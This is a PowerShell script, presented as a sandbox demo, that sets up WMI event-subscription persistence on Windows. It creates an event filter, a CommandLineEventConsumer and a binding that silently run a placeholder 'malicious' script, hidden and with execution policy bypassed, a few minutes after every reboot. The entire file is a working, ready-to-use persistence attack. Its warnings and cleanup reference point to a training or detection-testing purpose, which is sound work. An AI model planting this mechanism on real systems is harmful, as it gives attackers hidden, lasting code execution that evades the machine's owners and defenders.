#CIM PERSISTENCE DEMO 
#
#    WARNING!!!!
#
#    USE THIS IN A SANDBOX ENVIRONMENT ONLY!!!!
#    YOU CAN USE THE cimcleanup.ps1 to clean this up. 
$ScriptPath = "C:\Path\To\YourMaliciousScript.ps1"   # Change this to a real test script

# CREATE EVENT FILTER
$FilterName = "Demo_StartupPersistence_Filter"

$FilterQuery = @"
SELECT * FROM __InstanceModificationEvent 
WITHIN 60 
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
AND TargetInstance.SystemUpTime >= 240 
AND TargetInstance.SystemUpTime < 325
"@

$Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{
    Name           = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $FilterQuery
} -ErrorAction Stop

Write-Host "[+] Event Filter created: $FilterName" -ForegroundColor Green

# RUNS A HIDDEN POWERSHELL SCRIPT (CONSUMER)
$ConsumerName = "Demo_StartupPersistence_Consumer"

$CommandLine = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""

$Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property @{
    Name               = $ConsumerName
    CommandLineTemplate = $CommandLine
} -ErrorAction Stop

Write-Host "[+] CommandLineEventConsumer created: $ConsumerName" -ForegroundColor Green

# BIND TO CONSUMER
$BindingName = "Demo_StartupPersistence_Binding"

$Binding = New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter   = [Ref]$Filter
    Consumer = [Ref]$Consumer
} -ErrorAction Stop

Write-Host "[+] FilterToConsumerBinding created successfully!" -ForegroundColor Green
Write-Host "Persistence is now active. It will execute $ScriptPath approximately 4-5 minutes after reboot." -ForegroundColor Yellow

# SHOWS YOU WHAT WAS CREATED (PLEASE USE THE cimcleanup.ps1 TO REVERSE WHAT WAS WRITTEN)
# DEMONSTRATION SHOULD ONLY BE RUN IN YOUR SANDBOX ENVIRONMENT NOT IN PRODUCTION 
Write-Host "`nCreated objects:" -ForegroundColor Cyan
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object Name -eq $FilterName
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer | Where-Object Name -eq $ConsumerName
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -like "*$FilterName*" }
